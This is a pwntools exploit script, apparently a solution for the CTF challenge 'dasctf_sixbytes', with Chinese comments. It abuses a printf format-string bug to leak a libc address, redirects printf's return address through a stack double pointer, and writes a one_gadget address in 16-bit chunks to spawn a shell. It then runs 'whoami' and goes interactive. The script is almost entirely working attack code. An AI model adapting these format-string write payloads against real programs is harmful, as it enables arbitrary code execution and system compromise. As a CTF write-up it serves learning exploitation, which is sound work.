from pwn import *
from struct import pack
from ctypes import *

# io = remote("127.0.0.1", 55299)
# io = remote("192.168.170.128", 1234)
io = process("./dasctf_sixbytes")
# io = remote("node5.buuoj.cn", 27073)
# context(os="linux", arch="amd64")
# context(os="linux", arch="amd64", log_level="debug")
elf = ELF('./dasctf_sixbytes')
libc = ELF('./libc.so.6')
# libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda text, data: io.sendafter(text, data)
sla = lambda text, data: io.sendlineafter(text, data)
r = lambda n: io.recv(n)
ru = lambda text: io.recvuntil(text)
rl = lambda: io.recvline()
uu32 = lambda: u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))
uu64 = lambda: u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda: int(io.recv(10), 16)
iuu64 = lambda: int(io.recv(6), 16)
uheap = lambda: u64(io.recv(6).ljust(8, b'\x00'))
# lg = lambda addr: log.success(addr)
# lg = lambda addr: log.info(addr)
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(str(data))))
ia = lambda: io.interactive()
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))

# gdb.attach(io)
gdb.attach(io, 'b printf')
# gdb.attach(io, 'b *0x4011B4')

# 用的2.31-9.16版本的
ru(b'Gift addr: ')
bp = int(r(12), 16)
lg('bp')
ru(b'message: ')
s(b'%p-' * 50)

payload = b'%p' * 16 + b'-' + b'%p' + b'-'    # 泄露第17个参数，即__libc_start_main+243
len_p1 = len(payload)
payload += f'%{(bp-0x28 - 0xa1) & 0xffff}c%hn'.encode('utf-8')    # 修改第19个参数，即二级指针，修改为printf的返回地址所在栈
lg('bp-0x28 & 0xffff')
len_p2 = len(payload)
payload += f'%{(0x1033F - (bp-0x28)) & 0xffff}c%47$hhn'.encode('utf-8')
payload = payload.ljust(0x100, b'\x00')
s(payload)

ru(b'-')
libc_base = int(io.recvuntil(b'-', drop='True'), 16) - 243 - libc.sym['__libc_start_main']
lg('libc_base')
payload_ret = f'%{0x3f}c%47$hhn'.encode()
stack_ret = bp - 0x20   # ret的栈，即printf返回地址+8
lg('stack_ret')

onegg = [0xe3afe, 0xe3b01, 0xe3b04]
use_onegg = libc_base + onegg[1]
lg('use_onegg')
use_onegg1 = use_onegg & 0xffff
use_onegg2 = use_onegg >> 16 & 0xffff
use_onegg3 = use_onegg >> 32 & 0xffff
use_onegg4 = use_onegg >> 48 & 0xffff
for i in range(1, 5):
    lg(f"use_onegg{i}")

# 二级指针偏移：35 -> 49
# 第1次
payload1 = payload_ret + f'%{(stack_ret - 0x3f) & 0xffff}c%35$hn'.encode()
payload1 = payload1.ljust(0x100, b'\x00')
s(payload1)
payload1 = payload_ret + f'%{(use_onegg1 - 0x3f) & 0xffff}c%49$hn'.encode()
payload1 = payload1.ljust(0x100, b'\x00')
s(payload1)

#第2次
payload2 = payload_ret + f'%{(stack_ret + 2 - 0x3f) & 0xffff}c%35$hn'.encode()
payload2 = payload2.ljust(0x100, b'\x00')
s(payload2)
payload2 = payload_ret + f'%{(use_onegg2 - 0x3f) & 0xffff}c%49$hn'.encode()
payload2 = payload2.ljust(0x100, b'\x00')
s(payload2)

#第3次
payload3 = payload_ret + f'%{(stack_ret + 4 - 0x3f) & 0xffff}c%35$hn'.encode()
payload3 = payload3.ljust(0x100, b'\x00')
s(payload3)

payload3 = payload_ret + f'%{(use_onegg3 - 0x3f) & 0xffff}c%49$hn'.encode()
payload3 = payload3.ljust(0x100, b'\x00')
s(payload3)

# 0x0 修改他干嘛
# #第4次
# payload3 = payload_ret + f'%{(stack_onegg + 6 - 0x3f) & 0xffff}c%35$hn'.encode()
# s(payload3)
# payload3 = payload_ret + f'%{use_onegg4 - 0x3f & 0xffff}%49$hn'.encode()


# ret = 0x40101a
s(f'%{0x101a}c%47$hn'.encode().ljust(0x100, b'\x00'))
sl(b'whoami')

ia()